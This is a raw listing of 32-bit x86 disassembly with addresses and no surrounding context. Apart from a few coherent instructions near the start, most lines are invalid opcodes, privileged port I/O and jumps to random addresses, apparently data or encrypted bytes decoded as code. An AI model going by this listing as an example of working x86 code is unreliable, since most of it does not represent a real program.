  42409e:	lods   eax,DWORD PTR ds:[esi]
  42409f:	int3   
  4240a0:	into   
  4240a1:	mov    bh,0xe2
  4240a3:	jmp    0xeefb:0xd2f7f2df
  4240aa:	cmc    
  4240ab:	out    dx,al
  4240ac:	sar    ebx,1
  4240ae:	(bad)  
  4240b0:	fild   WORD PTR [edx]
  4240b2:	les    ecx,FWORD PTR [edx]
  4240b4:	add    eax,edi
  4240b6:	or     eax,0xe706c909
  4240bb:	mov    ebp,0xcde4c1bc
  4240c0:	mov    bh,0xcd
  4240c2:	fcomi  st,st(2)
  4240c4:	shl    BYTE PTR [esi-0x41453328],1
  4240ca:	xor    eax,0x75108b5
  4240cf:	add    eax,0x3272fb
  4240d4:	mov    DWORD PTR [ebp-0x80],eax
  4240d7:	jmp    0x4240f1
  4240dc:	mov    eax,DWORD PTR [ebp+0xc]
  4240df:	xor    eax,0x75108b5
  4240e4:	mov    ecx,DWORD PTR [ebp-0x80]
  4240e7:	lea    eax,[ecx+eax*1+0x3272fb]
  4240ee:	mov    DWORD PTR [ebp-0x80],eax
  4240f1:	mov    eax,DWORD PTR [ebp-0x80]
  4240f4:	jmp    0x42649a
  4240f9:	sub    BYTE PTR [edx+esi*4+0x3a],bl
  4240fd:	not    BYTE PTR [eax+esi*2+0x6c]
  424101:	push   esi
  424102:	je     0x4240ee
  424104:	hlt    
  424105:	mov    ds:0xe4d95ece,al
  42410a:	fs jp  0x424188
  42410d:	add    bl,BYTE PTR [eax-0x253c8485]
  424113:	fnstsw WORD PTR [ebp-0x153afc27]
  424119:	shl    bh,cl
  42411b:	call   0xf41d380e
  424120:	fucomp st(0)
  424122:	shl    dl,0xdd
  424125:	int3   
  424126:	in     al,dx
  424127:	(bad)  
  424128:	(bad)  
  424129:	iret   
  42412a:	out    0xe9,al
  42412c:	hlt    
  42412d:	test   edx,0xe2d2cbdc
  424133:	into   
  424134:	mov    ch,0xd3
  424136:	mov    edi,0xd503bdf0
  42413b:	or     bh,dh
  42413d:	jecxz  0x424122
  42413f:	cld    
  424140:	int3   
  424141:	shl    al,cl
  424143:	shr    eax,1
  424145:	loop   0x4240fa
  424147:	enter  0xd9db,0xe5
  42414b:	into   
  42414c:	sar    DWORD PTR [esi-0x354b3641],1
  424152:	out    dx,al
  424153:	out    dx,eax
  424154:	out    dx,al
  424155:	shl    dh,0xc4
  424158:	cli    
  424159:	add    al,0xe7
  42415b:	or     ecx,edi
  42415d:	aam    0xdb
  42415f:	int3   
  424160:	add    esp,ebp
  424162:	in     al,0xaf
  424164:	ret    0xf2c1
  424167:	leave  
  424168:	loopne 0x424161
  42416a:	clc    
  42416b:	cmc    
  42416c:	hlt    
  42416d:	retf   0xf8b6
  424170:	mov    esi,0xedd5baba
  424175:	shl    bl,cl
  424177:	fild   WORD PTR [edi]
  424179:	(bad)  
  42417a:	jecxz  0x424151
  42417c:	push   es
  42417d:	in     eax,dx
  42417e:	les    eax,FWORD PTR [esi]
  424180:	or     eax,0xefd3a907
  424185:	shl    ah,cl
  424187:	enter  0xd9eb,0xf3
  42418b:	fldl2e 
  42418d:	retf   
  42418e:	retf   
  42418f:	mov    esp,0xbc02f3df
  424194:	add    esp,edi
  424196:	fadd   DWORD PTR [ebx]
  424198:	icebp  
  424199:	ror    BYTE PTR [ebx],cl
  42419b:	ffreep st(1)
  42419d:	add    ecx,DWORD PTR [eax]
  42419f:	in     al,dx
  4241a0:	int    0x1
  4241a2:	(bad)  
  4241a3:	scas   eax,DWORD PTR es:[edi]
  4241a4:	in     eax,dx
  4241a5:	mov    bl,0xc3
  4241a7:	out    dx,al
  4241a8:	retf   
  4241a9:	cli    
  4241aa:	enter  0xd7f9,0xbf
  4241ae:	repz mov edi,0xdb02d7bb
  4241b4:	out    dx,al
  4241b5:	loope  0x424192
  4241b7:	cmc    
  4241b8:	ret    
  4241b9:	sar    cl,1
  4241bb:	enter  0xedc9,0xd5
  4241bf:	(bad)  
  4241c1:	out    0xc9,al
  4241c3:	les    edi,FWORD PTR [edi-0x2e523e3a]
  4241c9:	in     eax,0xc5
  4241cb:	hlt    
  4241cc:	out    dx,al
  4241cd:	(bad)  
  4241ce:	(bad)  
  4241cf:	retf   
  4241d0:	mov    ch,0xd8
  4241d2:	into   
  4241d3:	aad    0xbe
  4241d5:	aad    0xde
  4241d7:	add    cl,al
  4241d9:	xlat   BYTE PTR ds:[ebx]
  4241da:	(bad)  
  4241dc:	add    cl,al
  4241de:	cld    
  4241df:	fmul   QWORD PTR [ecx]
  4241e1:	stc    
  4241e2:	shl    BYTE PTR [edx-0xe313e43],1
  4241e8:	mov    dl,0xcb
  4241ea:	int3   
  4241eb:	mov    cl,0xe8
  4241ed:	int3   
  4241ee:	(bad)  
  4241ef:	fsub   st(1),st
  4241f1:	lock mov esi,0xe5b4c3e2
  4241f7:	sti    
  4241f8:	loop   0x4241d6
  4241fa:	add    al,0xfd
  4241fc:	enter  0xd5f4,0xe7
  424200:	ror    DWORD PTR [esp+ebp*8],0xdc
  424204:	mov    dl,0xc0
  424206:	rol    dl,1
  424208:	into   
  424209:	mov    ebx,0xbed0f9e7
  42420e:	jmp    0xf9be:0xd001b4da
  424215:	int    0xf4
  424217:	aam    0xd2
  424219:	bnd call 0xdc4e3a08
  42421f:	fsubrp st(1),st
  424221:	stc    
  424222:	shr    eax,0xdd
  424225:	in     al,dx
  424226:	jmp    0xcb1d10f7
  42422b:	in     eax,dx
  42422c:	leave  
  42422d:	(bad)
  424231:	enter  0xbaf4,0xdf
  424235:	aad    0xdd
  424237:	(bad)  
  424238:	retf   
  424239:	or     esp,eax
  42423b:	idiv   dl
  42423d:	push   cs
  42423e:	in     al,dx
  42423f:	push   cs
  424240:	(bad)  
  424241:	fsub   st(6),st
  424243:	out    0xd2,al
  424245:	div    BYTE PTR [eax-0x3057183b]
  42424b:	in     al,dx
  42424c:	out    dx,al
  42424d:	clc    
  42424e:	rcl    edx,cl
  424250:	in     al,dx
  424251:	out    dx,eax
  424252:	(bad)  
  424254:	rcr    ebx,0xf9
  424257:	frndint 
  424259:	sar    BYTE PTR [edi-0x1b1410f8],1
  42425f:	or     eax,0xc7bcdc0c
  424264:	repnz fadd st(2),st
  424267:	mov    cl,0xe9
  424269:	mov    cl,0xf2
  42426b:	aam    0xd2
  42426d:	aam    0xcd
  42426f:	in     eax,dx
  424270:	leave  
  424271:	mov    ebp,0xf8f8dafa
  424276:	fsub   st,st(5)
  424278:	add    al,0xe1
  42427a:	cli    
  42427b:	hlt    
  42427c:	enter  0x1e5,0xcd
  424280:	add    eax,0xafefaff1
  424285:	fsubrp st(5),st
  424287:	call   0xb9f63c3e
  42428c:	cli    
  42428d:	mov    al,0xf1
  42428f:	fdiv   st(1),st
  424291:	(bad)  
  424293:	lock mov esp,0xfadcd4ed
  424299:	mov    BYTE PTR ds:0xcbe00ec0,0xed
  4242a0:	cli    
  4242a1:	in     eax,dx
  4242a2:	mov    bl,0xbc
  4242a4:	in     eax,dx
  4242a5:	mov    dl,0xc3
  4242a7:	mov    bh,0xb6
  4242a9:	retf   
  4242aa:	rcl    edx,cl
  4242ac:	lds    esi,FWORD PTR [ebp-0x11474948]
  4242b2:	(bad)  
  4242b3:	aad    0xef
  4242b5:	shl    bh,1
  4242b7:	add    DWORD PTR [ebx],ecx
  4242b9:	(bad)  
  4242ba:	jecxz  0x4242a5
  4242bc:	push   es
  4242bd:	faddp  st(3),st
  4242bf:	call   0xb2f4368e
  4242c4:	jmp    0xb80e23b5
  4242c9:	int    0xd9
  4242cb:	mov    dl,0xb5
  4242cd:	int3   
  4242ce:	mov    edx,0xd8e1d6d9
  4242d3:	clc    
  4242d4:	bnd ret 
  4242d6:	clc    
  4242d7:	cmc    
  4242d8:	repz mov eax,0xeec8f5f4
  4242de:	out    dx,eax
  4242df:	fisttp WORD PTR [edi]
  4242e1:	stc    
  4242e2:	out    dx,eax
  4242e3:	fstp   st(4)
  4242e5:	in     al,0xb7
  4242e7:	stos   BYTE PTR es:[edi],al
  4242e8:	xlat   BYTE PTR ds:[ebx]
  4242e9:	mov    bl,0xe4
  4242eb:	sti    
  4242ec:	fcom   st(5)
  4242ee:	repnz mov ah,0xf7
  4242f1:	int3   
  4242f2:	(bad)  
  4242f3:	aam    0xbf
  4242f5:	loope  0x4242db
  4242f7:	aam    0xf3
  4242f9:	in     al,0xd8
  4242fb:	cld    
  4242fc:	fiadd  WORD PTR [ebx]
  4242fe:	aad    0xe0
  424300:	leave  
  424301:	fmul   st,st(1)
  424303:	rcr    esp,0xd0
  424306:	shl    edi,0xcc
  424309:	div    DWORD PTR [ebx-0x31012548]
  42430f:	out    dx,al
  424310:	fdiv   st,st(0)
  424312:	loopne 0x4242e7
  424314:	clc    
  424315:	ret    0xe1dc
  424318:	jmp    0x4242db
  42431a:	leave  
  42431b:	jmp    0xe0a17ea
  424320:	leave  
  424321:	pop    es
  424322:	enter  0xc1dc,0xad
  424326:	cmc    
  424327:	lock mov ch,0xa8
  42432a:	fcmovnu st,st(7)
  42432c:	in     eax,0xc9
  42432e:	mov    ch,0xf6
  424330:	(bad)  
  424332:	shl    bl,cl
  424334:	clc    
  424335:	lock inc al
  424338:	lock neg al
  42433b:	add    al,0xcb
  42433d:	retf   0xc2eb
  424340:	or     DWORD PTR [ecx],eax
  424342:	(bad)
  424345:	iret   
  424346:	jecxz  0x42432f
  424348:	out    dx,eax
  424349:	retf   0xb2eb
  42434c:	mov    ecx,0xeac9d9ee
  424351:	loop   0x424334
  424353:	sti    
  424354:	add    esi,DWORD PTR [ebx+ebx*8-0x1e191514]
  42435b:	mov    esi,0xef06e4dd
  424360:	add    BYTE PTR [eax],al
  424362:	in     al,dx
  424363:	mov    al,0xc3
  424365:	loopne 0x424336
  424367:	in     al,0xce
  424369:	mov    ah,0xb9
  42436b:	shl    cl,0xac
  42436e:	xlat   BYTE PTR ds:[ebx]
  42436f:	fstp   st(2)
  424371:	jmp    0xfa294b4b
  424376:	hlt    
  424377:	out    0xf9,al
  424379:	aad    0xf4
  42437b:	loopne 0x424380
  42437d:	leave  
  42437e:	(bad)  
  42437f:	jmp    0x42434e
  424381:	push   cs
  424382:	(bad)
  424385:	jecxz  0x424347
  424387:	(bad)
  42438a:	in     al,dx
  42438b:	mov    ah,0xb7
  42438d:	jmp    0xd414028f
  424392:	mov    edi,0xf307d4dd
  424397:	(bad)  
  424399:	loop   0x42438b
  42439b:	(bad)  
  42439c:	out    0xc5,al
  42439e:	jmp    0xe0504767
  4243a3:	in     al,0xea
  4243a5:	scas   al,BYTE PTR es:[edi]
  4243a6:	mov    cl,0xea
  4243a8:	mov    cl,0xf3
  4243aa:	in     al,0xb4
  4243ac:	(bad)  
  4243ad:	mov    ebx,0xd2b1b2c9
  4243b2:	cld    
  4243b3:	add    edi,DWORD PTR [esi+edi*8-0x3d00142c]
  4243ba:	jecxz  0x424397
  4243bc:	or     bl,bh
  4243be:	out    0xa,al
  4243c0:	jmp    0x4243a9
  4243c2:	in     eax,dx
  4243c3:	into   
  4243c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243c5:	shl    dl,cl
  4243c7:	mov    cl,0xb6
  4243c9:	aam    0xd0
  4243cb:	mov    eax,0xd2cff8eb
  4243d0:	icebp  
  4243d1:	into   
  4243d2:	iret   
  4243d3:	sti    
  4243d4:	(bad)  
  4243d6:	sar    BYTE PTR [esi-0x9062228],1
  4243dc:	or     BYTE PTR [edx],cl
  4243de:	loope  0x4243e5
  4243e0:	in     al,dx
  4243e1:	fdivr  st(1),st
  4243e3:	loop   0x424393
  4243e5:	mov    bh,0xed
  4243e7:	(bad)  
  4243e8:	loopne 0x4243b7
  4243ea:	aam    0xef
  4243ec:	mov    ch,0xf1
  4243ee:	leave  
  4243ef:	(bad)  
  4243f1:	fadd   QWORD PTR [ebx]
  4243f3:	fst    st(1)
  4243f5:	icebp  
  4243f6:	(bad)
  4243f9:	test   al,0xc1
  4243fc:	fcmovb st,st(7)
  4243fe:	int    0xea
  424400:	fyl2x  
  424402:	sar    BYTE PTR [edi-0x1f112e2d],0xb2
  424409:	in     al,dx
  42440a:	hlt    
  42440b:	cli    
  42440c:	in     al,0xd5
  42440e:	mov    eax,0xc3bacbd7
  424413:	add    esi,edx
  424415:	rol    eax,cl
  424417:	cli    
  424418:	or     edx,edx
  42441a:	stc    
  42441b:	clc    
  42441c:	push   cs
  42441d:	push   cs
  42441e:	fdivr  st,st(2)
  424420:	(bad)  
  424422:	scas   al,BYTE PTR es:[edi]
  424423:	in     eax,dx
  424424:	out    dx,al
  424425:	icebp  
  424426:	enter  0xd6e6,0xef
  42442a:	repz retf 
  42442c:	leave  
  42442d:	int    0xdd
  42442f:	clc    
  424430:	sti    
  424431:	repz mov esi,0xddbfe600
  424437:	fcom   st(5)
  424439:	add    DWORD PTR [ecx],eax
  42443b:	fild   WORD PTR ds:0xcdc8dabc
  424441:	or     esi,ecx
  424443:	scas   al,BYTE PTR es:[edi]
  424444:	(bad)  
  424445:	icebp  
  424446:	mov    cl,0xb1
  424448:	in     eax,0xb1
  42444a:	shl    cl,cl
  42444c:	(bad)  
  42444d:	bnd jmp 0xc9f74445
  424453:	faddp  st(3),st
  424455:	jecxz  0x424433
  424457:	(bad)  
  424458:	(bad)  
  424459:	fadd   st,st(4)
  42445b:	out    0xf8,eax
  42445d:	out    dx,eax
  42445e:	int    0x6
  424460:	fcos   
  424462:	(bad)  
  424463:	ffree  st(3)
  424465:	mov    ebp,0xc2b7cab2
  42446a:	out    dx,eax
  42446b:	jmp    0x42445c
  42446d:	cmc    
  42446e:	xlat   BYTE PTR ds:[ebx]
  42446f:	aam    0xbb
  424471:	ror    eax,1
  424473:	fistp  QWORD PTR [ebp-0x211b210f]
  424479:	mov    eax,0xd4e3c9df
  42447e:	out    0xb,eax
  424480:	leave  
  424481:	jmp    0x42444e
  424483:	into   
  424484:	jecxz  0x42443d
  424486:	fucomp st(6)
  424488:	fidiv  DWORD PTR [edi-0x29112d2c]
  42448e:	retf   
  42448f:	sar    DWORD PTR [ebp+0x7bfbfbc],1
  424495:	rcr    bh,0x7
  424498:	shl    bl,1
  42449a:	in     eax,0x2
  42449c:	stc    
  42449d:	jmp    0x424485
  42449f:	pop    es
  4244a0:	out    dx,al
  4244a1:	cld    
  4244a2:	fmul   st(6),st
  4244a4:	in     al,dx
  4244a5:	lods   al,BYTE PTR ds:[esi]
  4244a6:	aam    0xaa
  4244a8:	mov    cl,0xb1
  4244aa:	mov    al,0xef
  4244ac:	stc    
  4244ad:	(bad)  
  4244ae:	sti    
  4244af:	mov    ah,0xcd
  4244b1:	jecxz  0x424472
  4244b3:	icebp  
  4244b4:	stc    
  4244b5:	std    
  4244b6:	clc    
  4244b7:	fptan  
  4244b9:	add    eax,0xcbe70bf4
  4244be:	aad    0xdf
  4244c0:	into   
  4244c1:	ror    dl,0xad
  4244c4:	shr    eax,1
  4244c6:	loopne 0x42447f
  4244c8:	jmp    0xc9f9359c
  4244cd:	(bad)  
  4244ce:	std    
  4244cf:	mov    ebx,0xdce9e9eb
  4244d4:	in     al,dx
  4244d5:	sti    
  4244d6:	(bad)
  4244d9:	fucomi st,st(0)
  4244db:	add    ch,ah
  4244dd:	retf   
  4244de:	or     edi,ebp
  4244e0:	ficom  DWORD PTR [edx]
  4244e2:	stos   BYTE PTR es:[edi],al
  4244e3:	mov    eax,0xf3d2eedd
  4244e8:	iret   
  4244e9:	repnz mov bh,0xd9
  4244ec:	xlat   BYTE PTR ds:[ebx]
  4244ed:	shr    edi,cl
  4244ef:	rcr    ah,1
  4244f1:	mov    esp,0xced1c2f2
  4244f6:	in     al,dx
  4244f7:	(bad)  
  4244f9:	aad    0x1
  4244fb:	rcr    ecx,0xf5
  4244fe:	pop    es
  4244ff:	repz jmp 0x4244dc
  424502:	retf   
  424503:	loope  0x4244ec
  424505:	(bad)  
  424506:	call   0xcd3929c7
  42450b:	icebp  
  42450c:	fcmovbe st,st(2)
  42450e:	hlt    
  42450f:	cli    
  424510:	mov    ebp,0xe7d4f0db
  424515:	fst    st(4)
  424517:	hlt    
  424518:	xlat   BYTE PTR ds:[ebx]
  424519:	lds    eax,FWORD PTR [edi]
  42451b:	fsub   st,st(3)
  42451d:	into   
  42451e:	add    al,0xcb
  424520:	fucomp st(6)
  424522:	mov    bl,0xb3
  424524:	int3   
  424525:	scas   eax,DWORD PTR es:[edi]
  424526:	int    0xb4
  424528:	jmp    0x424518
  42452a:	mov    ecx,0xbfcccccb
  42452f:	cmc    
  424530:	shl    BYTE PTR [eax-0x8290e30],1
  424536:	add    dl,al
  424538:	out    0xdd,eax
  42453a:	pop    es
  42453b:	shr    al,1
  42453d:	fiadd  WORD PTR [ebx]
  42453f:	or     ebx,ecx
  424541:	fcomp  st(4)
  424543:	fistp  QWORD PTR [edi-0xb514f49]
  424549:	mov    bl,0xc8
  42454b:	(bad)
  42454e:	stc    
  42454f:	cmc    
  424550:	add    ecx,edi
  424552:	div    dh
  424554:	out    dx,al
  424555:	fadd   DWORD PTR [esi]
  424557:	cmc    
  424558:	jmp    0xdff4:0xfbfdcbcb
  42455f:	leave  
  424560:	ror    DWORD PTR [ecx],cl
  424562:	ror    edi,0xf7
  424565:	loope  0x42451a
  424567:	in     al,0xfb
  424569:	out    0xee,eax
  42456b:	cli    
  42456c:	leave  
  42456d:	jmp    0x424533
  42456f:	fdivr  st,st(1)
  424571:	(bad)  
  424572:	sti    
  424573:	rcl    cl,1
  424575:	icebp  
  424576:	(bad)  
  424577:	sar    al,cl
  424579:	lock jecxz 0x424555
  42457c:	bswap  edi
  42457e:	loope  0x424583
  424580:	in     eax,dx
  424581:	in     eax,dx
  424582:	(bad)
  424585:	test   al,0xcf
  424587:	mov    dh,0xd0
  424589:	xlat   BYTE PTR ds:[ebx]
  42458a:	out    0xb6,eax
  42458c:	iret   
  42458d:	retf   
  42458e:	mov    bl,0xc9
  424590:	cli    
  424591:	clc    
  424592:	add    edi,DWORD PTR [edx-0x73e2d02]
  424598:	aam    0x3
  42459a:	stc    
  42459b:	hlt    
  42459c:	fisttp DWORD PTR [edx]
  42459e:	or     al,0xfc
  4245a0:	jmp    0x42459a
  4245a2:	retf   
  4245a3:	iret   
  4245a4:	in     eax,0xeb
  4245a6:	in     eax,dx
  4245a7:	mov    cl,0xe7
  4245a9:	aam    0xc9
  4245ab:	(bad)  
  4245ac:	in     eax,0xff
  4245ae:	mov    ecx,0x1e1e8ec
  4245b3:	cld    
  4245b4:	fyl2xp1 
  4245b6:	stc    
  4245b7:	mov    edx,0xf4f9ebd9
  4245bc:	loopne 0x424584
  4245be:	retf   0xef9
  4245c1:	or     ebp,ebx
  4245c3:	out    dx,al
  4245c4:	loope  0x4245ac
  4245c6:	ret    
  4245c7:	out    0xc2,eax
  4245c9:	lods   al,BYTE PTR ds:[esi]
  4245ca:	mov    dh,0xc0
  4245cc:	aad    0xbb
  4245ce:	(bad)  
  4245d0:	neg    ecx
  4245d2:	(bad)  
  4245d3:	cmc    
  4245d4:	cli    
  4245d5:	fsubr  st(0),st
  4245d7:	add    eax,0xf7dfb8c0
  4245dc:	call   0xe04629a7
  4245e1:	jmp    0xeb1a0fb2
  4245e6:	shr    bl,1
  4245e8:	mul    dh
  4245ea:	retf   
  4245eb:	jmp    0xbfd4:0xd3cff2d8
  4245f2:	rcr    eax,1
  4245f4:	in     al,dx
  4245f5:	loope  0x4245c3
  4245f7:	push   es
  4245f8:	push   es
  4245f9:	or     DWORD PTR [ebx],ecx
  4245fb:	(bad)  
  4245fd:	clc    
  4245fe:	or     DWORD PTR [edi],ecx
  424600:	int3   
  424601:	or     ebp,ebx
  424603:	iret   
  424604:	mov    bl,0xe7
  424606:	loopne 0x4245e9
  424608:	in     al,0xc2
  42460a:	(bad)  
  42460b:	lock retf 
  42460d:	aam    0xf7
  42460f:	repnz xlat BYTE PTR ds:[ebx]
  424611:	loope  0x4245cd
  424613:	repnz loopne 0x4245fd
  424616:	int3   
  424617:	rcr    ch,0xf5
  42461a:	add    bl,dh
  42461c:	pop    es
  42461d:	(bad)  
  42461e:	retf   
  42461f:	or     edx,ecx
  424621:	in     eax,0xef
  424623:	ret    
  424624:	repnz repnz mov cl,0xc7
  424628:	int    0xf2
  42462a:	mov    al,0xc7
  42462c:	cmc    
  42462d:	out    dx,eax
  42462e:	mov    bl,0xea
  424630:	add    edx,eax
  424632:	mov    edx,0xf4e2fdde
  424637:	(bad)  
  424639:	aam    0xfd
  42463b:	retf   0xc6c5
  42463e:	add    al,BYTE PTR [eax]
  424640:	(bad)  
  424641:	fcomp  st(6)
  424643:	(bad)  
  424644:	in     al,dx
  424645:	shl    ecx,cl
  424647:	shl    bl,1
  424649:	mov    edx,0xfeb4bbf9
  42464e:	jmp    0xb8d9:0xf5d2d8fc
  424655:	fmul   st(5),st
  424657:	icebp  
  424658:	repz rcl dh,cl
  42465b:	call   0xcf2f523b
  424660:	adc    eax,DWORD PTR [esp+ebp*4]
  424663:	mov    esi,0xeaefb1e5
  424668:	loope  0x424638
  42466a:	out    dx,eax
  42466b:	clc    
  42466c:	in     eax,dx
  42466d:	mov    edx,0xfc02cfd0
  424672:	enter  0xc300,0xfe
  424676:	std    
  424677:	bnd ret 0xc5ea
  42467b:	lds    eax,FWORD PTR [eax]
  42467d:	out    0xef,al
  42467f:	cli    
  424680:	add    dl,cl
  424682:	out    0xee,eax
  424684:	repnz fdivr st(7),st
  424687:	mov    ch,0xe7
  424689:	call   0xd426fc6e
  42468e:	mov    ebp,0xfbd3fad1
  424693:	out    dx,al
  424694:	out    dx,al
  424695:	xlat   BYTE PTR ds:[ebx]
  424696:	in     al,dx
  424697:	out    0xe5,eax
  424699:	hlt    
  42469a:	or     ch,bl
  42469c:	fdivr  st(6),st
  42469e:	aam    0xcb
  4246a0:	or     ch,ah
  4246a2:	test   eax,0xd1cfc5e7
  4246a7:	hlt    
  4246a8:	mul    esp
  4246aa:	cli    
  4246ab:	not    esi
  4246ad:	mov    ebx,0xcfd9d5e4
  4246b2:	jmp    0xec46058c
  4246b7:	ret    0xc0f5
  4246ba:	add    edi,esp
  4246bc:	add    dl,ch
  4246be:	std    
  4246bf:	in     al,0xdc
  4246c1:	fistp  QWORD PTR [edi-0x1d3f1419]
  4246c7:	not    ecx
  4246c9:	loope  0x4246b9
  4246cb:	div    eax
  4246cd:	sti    
  4246ce:	fpatan 
  4246d0:	call   0xed321bc2
  4246d5:	int    0xd2
  4246d7:	in     al,dx
  4246d8:	in     eax,0xda
  4246da:	fisttp QWORD PTR [edx]
  4246dc:	stc    
  4246dd:	cld    
  4246de:	retf   0xcefa
  4246e1:	in     eax,0xea
  4246e3:	jmp    0xd6370997
  4246e8:	in     al,0xb1
  4246ea:	stc    
  4246eb:	mov    ecx,0xd9f1b8fe
  4246f0:	mov    ecx,0x3cff6b4
  4246f5:	clc    
  4246f6:	stc    
  4246f7:	jecxz  0x4246d5
  4246f9:	les    ecx,FWORD PTR [ecx]
  4246fb:	shl    bh,0xa
  4246fe:	(bad)  
  4246ff:	fdivr  st(2),st
  424701:	fisubr WORD PTR [ecx-0x3c10573f]
  424707:	(bad)
  42470a:	hlt    
  42470b:	xlat   BYTE PTR ds:[ebx]
  42470c:	retf   0xbeca
  42470f:	in     al,dx
  424710:	div    esi
  424712:	jmp    0xc4291e0a
  424717:	in     al,0xc2
  424719:	cmc    
  42471a:	inc    DWORD PTR [eax]
  42471c:	mov    ebp,0xf3e4e6e7
  424721:	iret   
  424722:	(bad)  
  424724:	scas   al,BYTE PTR es:[edi]
  424725:	out    dx,al
  424726:	imul   BYTE PTR [ebp-0x8481a0d]
  42472c:	lock fnstsw WORD PTR [edi-0x451c454a]
  424733:	jecxz  0x424702
  424735:	repnz cmc 
  424737:	ret    
  424738:	fsubr  st,st(1)
  42473a:	aam    0x8
  42473c:	iret   
  42473d:	in     eax,0xc
  42473f:	or     edi,ecx
  424741:	leave  
  424742:	in     eax,dx
  424743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424744:	vpavgb ymm0,ymm1,ymm2
  424749:	mov    al,0xc1
  42474b:	fcmove st,st(4)
  42474d:	cli    
  42474e:	fcmovne st,st(5)
  424750:	stc    
  424751:	add    esi,DWORD PTR [edi-0x321c080d]
  424757:	add    eax,0xc4e4f4f5
  42475c:	add    bl,ah
  42475e:	in     al,dx
  42475f:	out    0xfc,al
  424761:	loope  0x42471f
  424763:	iret   
  424764:	mov    cl,0xc3
  424766:	(bad)  
  424767:	mov    esp,0xd1bad2b5
  42476c:	in     eax,0xf3
  42476e:	int3   
  42476f:	(bad)  
  424771:	shl    edx,1
  424773:	lock pop es
  424775:	(bad)  
  424777:	in     al,dx
  424778:	ret    
  424779:	icebp  
  42477a:	add    al,0xc6
  42477c:	sti    
  42477d:	push   esp
  42477f:	or     BYTE PTR [esi],al
  424781:	add    ebx,esi
  424783:	(bad)  
  424784:	jmp    0xb716f76c
  424789:	in     al,dx
  42478a:	neg    bl
  42478c:	int3   
  42478d:	(bad)  [ebx-0x292b2241]
  424793:	(bad)  
  424795:	out    dx,al
  424796:	add    bl,dl
  424798:	loope  0x424795
  42479a:	call   0x8505196
  42479f:	or     BYTE PTR [edi+edi*8],cl
  4247a2:	jmp    0x424782
  4247a4:	test   al,0xc7
  4247a6:	retf   0xcee7
  4247a9:	ror    dl,0xea
  4247ac:	(bad)  
  4247ae:	shl    eax,1
  4247b0:	ffreep st(3)
  4247b2:	add    bh,ch
  4247b4:	shl    ebx,1
  4247b6:	mov    esp,0xd401d5f6
  4247bb:	fdiv   st,st(5)
  4247bd:	sti    
  4247be:	in     eax,dx
  4247bf:	jecxz  0x4247cd
  4247c1:	out    0xc5,eax
  4247c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247c4:	call   0xe1063aa7
  4247c9:	stc    
  4247ca:	enter  0xfec9,0xd0
  4247ce:	repnz sar BYTE PTR [esi+esi*8-0xc08402a],1
  4247d6:	sar    edx,cl
  4247d8:	hlt    
  4247d9:	aam    0xfe
  4247db:	loope  0x4247bd
  4247dd:	add    cl,cl
  4247df:	out    0xc5,al
  4247e1:	stc    
  4247e2:	mov    esi,0xaccad2d3
  4247e7:	mov    ch,0xcd
  4247e9:	(bad)  
  4247ea:	shr    edx,1
  4247ec:	(bad)  
  4247ed:	(bad)  
  4247ee:	(bad)  
  4247f0:	int3   
  4247f1:	mov    edi,0xf100cfbb
  4247f6:	sti    
  4247f7:	mov    esp,0xfbe0e6e2
  4247fc:	aad    0xff
  4247fe:	loope  0x424806
  424800:	or     eax,esp
  424802:	fucomp st(2)
  424804:	(bad)  
  424806:	shl    al,1
  424808:	(bad)  
  424809:	xlat   BYTE PTR ds:[ebx]
  42480a:	jmp    0xbdd1:0xd6cbb5db
  424811:	std    
  424812:	rol    ebx,1
  424814:	in     al,dx
  424815:	loope  0x42481a
  424817:	stc    
  424818:	(bad)  
  424819:	in     eax,0xe4
  42481b:	fcomi  st,st(4)
  42481d:	push   cs
  42481e:	push   es
  42481f:	fsubp  st(2),st
  424821:	bswap  edi
  424823:	loopne 0x424816
  424825:	int3   
  424826:	mov    ebp,0xcfd7eed7
  42482b:	aam    0xd6
  42482d:	jmp    0xe9264611
  424832:	mov    ecx,0xe2f9b500
  424837:	repz jmp 0x202:0xe3e5e5d1
  42483f:	(bad)  
  424841:	bswap  esi
  424843:	out    0xaf,al
  424845:	div    edx
  424847:	ror    eax,1
  424849:	mov    bh,0xf3
  42484b:	int    0xf3
  42484d:	cmc    
  42484e:	(bad)  
  42484f:	cld    
  424850:	mov    ecx,0xd9c8d7f4
  424855:	ret    0xe2d2
  424858:	aam    0xfa
  42485a:	xlat   BYTE PTR ds:[ebx]
  42485b:	ret    0xd8fd
  42485e:	or     esi,edi
  424860:	jmp    0xee140763
  424865:	jmp    0xf1132b31
  42486a:	mov    ebx,0xd4e6edf0
  42486f:	(bad)  
  424870:	(bad)  
  424872:	rcr    ecx,0xfe
  424875:	cli    
  424876:	add    esp,ebx
  424878:	(bad)  
  424879:	out    0xc9,al
  42487b:	jmp    0xdce3:0xf407cfdd
  424882:	loope  0x42486d
  424884:	enter  0xd3d7,0xe6
  424888:	shr    DWORD PTR [ebp+edx*8-0x2532035],1
  42488f:	not    al
  424891:	int3   
  424892:	stc    
  424893:	mov    ecx,0xdefefcd0
  424898:	shl    edi,cl
  42489a:	jmp    0x1028238e
  42489f:	pmaxsw mm5,mm0
  4248a2:	shl    dh,0xc0
  4248a5:	in     eax,0xc8
  4248a7:	shl    bl,1
  4248a9:	aad    0xe5
  4248ab:	retf   
  4248ac:	shl    al,1
  4248ae:	mov    edi,0xb8f9b8ef
  4248b3:	fnstcw WORD PTR [eax-0xf082227]
  4248b9:	add    ch,al
  4248bb:	lock sti 
  4248bd:	add    dl,ah
  4248bf:	or     eax,0xc6b80fdc
  4248c4:	loopne 0x4248bc
  4248c6:	lods   eax,DWORD PTR ds:[esi]
  4248c7:	mov    esp,0xd9b4f1b2
  4248cc:	ror    ebp,1
  4248ce:	fdecstp 
  4248d0:	xlat   BYTE PTR ds:[ebx]
  4248d1:	mov    ebp,0xd8f2d2f9
  4248d6:	(bad)  
  4248d8:	std    
  4248d9:	out    0xe8,eax
  4248db:	leave  
  4248dc:	shl    esi,0xe1
  4248df:	in     eax,0xd
  4248e1:	or     ch,ch
  4248e3:	shr    esi,0xf0
  4248e6:	imul   esp
  4248e8:	out    dx,eax
  4248e9:	cli    
  4248ea:	shl    ebx,0xc8
  4248ed:	idiv   BYTE PTR [eax-0x202f121c]
  4248f3:	(bad)  
  4248f5:	loopne 0x4248ec
  4248f7:	(bad)  
  4248f8:	repnz jecxz 0x4248f6
  4248fb:	push   es
